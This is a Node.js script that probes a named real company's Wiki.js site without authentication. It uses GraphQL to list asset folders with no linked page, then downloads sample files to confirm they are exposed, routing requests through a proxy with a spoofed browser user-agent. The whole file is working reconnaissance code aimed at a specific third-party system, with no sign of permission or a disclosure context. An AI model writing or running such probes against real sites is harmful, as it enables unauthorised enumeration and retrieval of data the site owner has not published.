// 40 - Unauthenticated Wiki.js asset-folder enumeration.
//
// assets.folders lists root folders; pages.list provides page paths. Folders
// with no matching page prefix are "unlinked"; many still contain downloadable
// assets. Counts/examples/status only; no image bytes.
//
// Run: node run.js

const { ProxyAgent, fetch } = require('undici');
const fs = require('fs');
const path = require('path');

const BASE = process.env.WIKI_BASE || 'https://wiki.bambulab.com';
const proxy = process.env.HTTPS_PROXY || process.env.HTTP_PROXY || 'http://127.0.0.1:7890';
const dispatcher = new ProxyAgent(proxy);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

async function gql(query) {
  const r = await fetch(BASE + '/graphql', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'user-agent': UA },
    body: JSON.stringify({ query }),
    dispatcher,
    signal: AbortSignal.timeout(60000),
  });
  return { status: r.status, text: await r.text() };
}

async function probe(p) {
  try {
    const r = await fetch(BASE + p, { headers: { 'user-agent': UA }, dispatcher, signal: AbortSignal.timeout(20000) });
    const b = await r.arrayBuffer();
    return { status: r.status, type: r.headers.get('content-type'), bytes: b.byteLength };
  } catch (e) { return { status: 'ERR', type: '', bytes: 0 }; }
}

(async () => {
  const results = {
    base: BASE,
    timestamp: new Date().toISOString(),
    hypothesis:
      'Unauthenticated assets.folders exposes asset folders that have no matching page path, and their assets are downloadable.',
    rootFolders: 0,
    unlinkedWithAssets: 0,
    examples: [],
    summary: {},
  };

  const f = await gql('{ assets { folders(parentFolderId:0){ id name } } }');
  let folders = [];
  try { folders = JSON.parse(f.text).data?.assets?.folders || []; } catch {}
  results.rootFolders = folders.length;

  const paths = new Set();
  for (const locale of ['en', 'zh']) {
    const p = await gql(`{ pages { list(locale:"${locale}"){ path } } }`);
    try { for (const x of JSON.parse(p.text).data?.pages?.list || []) paths.add(String(x.path).toLowerCase()); } catch {}
  }

  for (const folder of folders) {
    const name = String(folder.name).toLowerCase();
    const linked = [...paths].some((p) => p === name || p.startsWith(name + '/'));
    if (linked) continue;
    const a = await gql(`{ assets { list(folderId:${folder.id}, kind:ALL){ filename } } }`);
    let list = [];
    try { list = JSON.parse(a.text).data?.assets?.list || []; } catch {}
    if (!list.length) continue;
    results.unlinkedWithAssets++;
    const first = list[0]?.filename;
    const r = first ? await probe('/' + encodeURIComponent(folder.name) + '/' + encodeURIComponent(first)) : { status: 'n/a' };
    if (results.examples.length < 15 || name === 'n1') {
      results.examples.push({ folder: folder.name, id: folder.id, assets: list.length, first, status: r.status });
    }
  }

  results.summary = {
    rootFolders: results.rootFolders,
    unlinkedWithAssets: results.unlinkedWithAssets,
    firstAssetStatuses200: results.examples.every((e) => e.status === 200),
  };
  console.log('SUMMARY', JSON.stringify(results.summary));

  fs.writeFileSync(path.join(__dirname, 'results.json'), JSON.stringify(results, null, 2));
  fs.writeFileSync(
    path.join(__dirname, 'results.txt'),
    [
      `rootFolders: ${results.rootFolders}`,
      `unlinkedWithAssets: ${results.unlinkedWithAssets}`,
      ...results.examples.map((e) => `EXAMPLE ${e.folder} assets=${e.assets} first=${e.first} status=${e.status}`),
      'SUMMARY ' + JSON.stringify(results.summary),
    ].join('\n') + '\n'
  );
  process.exit(0);
})();
